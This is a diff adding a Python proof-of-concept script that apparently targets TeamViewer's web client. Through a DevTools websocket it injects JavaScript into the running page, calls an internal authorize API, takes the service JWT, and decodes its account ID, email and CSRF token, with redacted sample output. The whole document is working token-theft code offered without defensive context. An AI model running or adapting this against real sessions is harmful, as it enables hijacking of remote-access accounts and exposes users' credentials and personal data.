@@ -1,0 +1,55 @@
+"""
+teamviewer_jwt_extraction.py -- JWT de servicio
+Extrae y decodifica el token de autenticacion del servicio.
+"""
+import websocket
+import json
+import base64
+
+INTERNAL_DOMAIN = "https://teamviewer-internal-<HASH>"
+
+def extract_jwt_token(ws):
+    """Extraer JWT de servicio via API interna."""
+    js = f"""
+    (async () => {{
+        const r = await fetch('{INTERNAL_DOMAIN}/api/p2auth/v2/authorize');
+        return JSON.stringify(await r.json());
+    }})()
+    """
+
+    ws.send(json.dumps({
+        "id": 30,
+        "method": "Runtime.evaluate",
+        "params": {"expression": js, "awaitPromise": True}
+    }))
+
+    result = json.loads(ws.recv())
+    data = json.loads(result["result"]["result"]["value"])
+    token = data.get("token", "")
+
+    # Decodificar payload del JWT
+    parts = token.split(".")
+    if len(parts) == 3:
+        payload_b64 = parts[1]
+        padding = 4 - len(payload_b64) % 4
+        if padding != 4:
+            payload_b64 += "=" * padding
+        claims = json.loads(
+            base64.urlsafe_b64decode(payload_b64)
+        )
+
+        print("[+] JWT Service Token extraido")
+        print(f"    tokenType:  {claims.get('tokenType')}")
+        print(f"    accountId:  {claims.get('accountId')}")
+        print(f"    email:      {claims.get('email', 'N/A')}")
+        print(f"    csrfToken:  {claims.get('csrfToken', 'N/A')[:20]}...")
+        print(f"    exp:        {claims.get('exp')}")
+
+    return claims
+
+# Output (redactado):
+# tokenType:  SERVICE_TOKEN
+# accountId:  <ACCOUNT_ID_REDACTED>
+# email:      <EMAIL_REDACTED>
+# csrfToken:  <TOKEN_REDACTED>...
+# exp:        <TIMESTAMP_22H_FUTURO>
